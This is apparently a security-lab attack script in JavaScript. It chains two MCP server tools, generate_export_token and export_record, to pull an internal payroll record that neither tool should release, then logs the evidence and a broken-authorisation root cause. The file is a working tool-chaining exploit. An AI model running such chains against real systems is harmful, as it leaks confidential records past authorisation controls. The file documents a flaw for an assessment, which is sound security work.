/*
 * Attack 3 - Capability Chaining
 * Pick two INDIVIDUALLY low-risk tools - generate_export_token and export_record
 * - and chain them so the output of the first (a token) lets the second reach a
 * HIGH-risk outcome: dumping an internal record that neither tool should release.
 * Documents the full chain and the result.
 */
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { connect, textOf } from "./mcp_client.js";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const EVIDENCE = path.join(__dirname, "..", "reports", "evidence");

const INTERNAL_RECORD = "payroll-2026-summary"; // flagged internal:true on the server

async function main() {
  const { client, transport } = await connect("p4-attack3");

  // --- Show each tool is low-risk on its own ------------------------------- //
  // generate_export_token alone returns only an opaque token (no data).
  const tokenOnly = await client.callTool({
    name: "generate_export_token",
    arguments: { record_id: INTERNAL_RECORD },
  });
  const token = textOf(tokenOnly).trim();

  // export_record alone is useless without a valid token.
  const guessToken = "exp_" + Buffer.from("guessed-record-id").toString("base64");
  const noToken = await client.callTool({
    name: "export_record",
    arguments: { token: guessToken },
  }).catch((e) => ({ content: [{ type: "text", text: String(e) }] }));

  // --- The chain: step 1 output enables step 2 ----------------------------- //
  const step2 = await client.callTool({ name: "export_record", arguments: { token } });
  const leaked = textOf(step2).trim();

  const evidence = {
    attack: "Attack 3 - Capability Chaining",
    objective: "Combine two low-risk tools to reach a high-risk data-disclosure outcome.",
    low_risk_tools: ["generate_export_token (Low)", "export_record (Low)"],
    individual_behaviour: {
      generate_export_token_alone: "returns only an opaque token, no record data",
      export_record_without_valid_token: textOf(noToken).trim(),
    },
    chain: [
      { step: 1, tool: "generate_export_token", arguments: { record_id: INTERNAL_RECORD }, output: token },
      { step: 2, tool: "export_record", arguments: { token }, output: leaked },
    ],
    high_risk_outcome: leaked,
    success: /SSN|CONFIDENTIAL|payroll/i.test(leaked),
    root_cause:
      "Neither tool performs an authorisation check. generate_export_token mints a token for ANY " +
      "record id (including internal ones) and export_record redeems ANY token. Each looks harmless " +
      "in isolation, but the token from step 1 is exactly the capability step 2 needs to disclose " +
      "an internal record - a broken-object-level-authorisation chain.",
    timestamp: new Date().toISOString(),
  };

  fs.mkdirSync(EVIDENCE, { recursive: true });
  fs.writeFileSync(path.join(EVIDENCE, "attack3_capability_chaining.json"), JSON.stringify(evidence, null, 2));

  console.log("=== Attack 3 - Capability Chaining ===");
  console.log("Step 1 generate_export_token ->", token);
  console.log("Step 2 export_record ->", leaked.slice(0, 80), "...");
  console.log("Success:", evidence.success);

  await client.close();
  await transport.close().catch(() => {});
}

main().catch((e) => { console.error(e); process.exit(1); });
